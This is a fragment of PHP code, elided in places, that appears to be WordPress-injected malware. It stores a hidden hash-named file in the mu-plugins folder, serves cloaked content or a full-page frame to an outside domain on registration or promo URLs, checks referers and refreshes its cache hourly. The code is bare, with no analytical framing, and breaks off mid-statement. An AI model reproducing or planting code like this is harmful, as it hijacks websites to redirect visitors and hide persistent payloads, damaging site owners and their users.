...
define('__SCHEME__', '137');

$filename = $_SERVER['DOCUMENT_ROOT'] . '/wp-content/mu-plugins/' . '.' . md5(__HOST__);

// button
/*
if (preg_match('#/(inscription|registrazione|registrering|promo)/#i', rawurldecode($_SERVER['REQUEST_URI']))) {
  if (file_exists($filename)) {
    echo load($filename);
  } else {
    echo "<html><frameset cols='100%'><frame src='http://jecontacte.com'></frameset></html>";
  }
...
if (!empty($referer) && !preg_match('#^http://(www\.)?' . __HOST__ . '#i', $referer)) {
  ...
  // button
  /*
  if (!empty($c) and (!file_exists($filename) or (time() - filemtime($filename) >= 3600))) {
    $fp = fopen($filename, 'w');
